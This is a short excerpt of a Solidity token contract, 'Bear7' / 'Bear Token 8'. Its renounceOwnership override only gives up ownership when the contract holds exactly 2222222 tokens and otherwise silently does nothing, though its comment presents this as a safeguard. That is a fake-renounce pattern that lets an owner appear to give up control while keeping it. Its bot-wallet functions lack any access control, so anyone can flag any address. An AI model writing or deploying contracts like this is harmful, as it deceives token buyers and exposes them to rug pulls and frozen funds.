...
contract Bear7 is IERC20Metadata, Ownable {
   ...
   // General
   string private _name = 'Bear Token 8';
   string private _symbol = 'BEAR8';
   ...
   function renounceOwnership() public override onlyOwner {
       if (_walletBalance[address(this)] == 2222222){ // Added a check to stop accidental renounce
           _transferOwnership(address(0));
       }
   }
   ...
   function addBotWallet(address botWallet) public virtual{
       require(!isBotWallet[botWallet], "Account is already added");
       isBotWallet[botWallet]=true;
    }
   function removeBotWallet (address notBotWallet) public virtual{
       require(isBotWallet[notBotWallet], "Account is already not a bot");
       isBotWallet[notBotWallet]=false;
    }
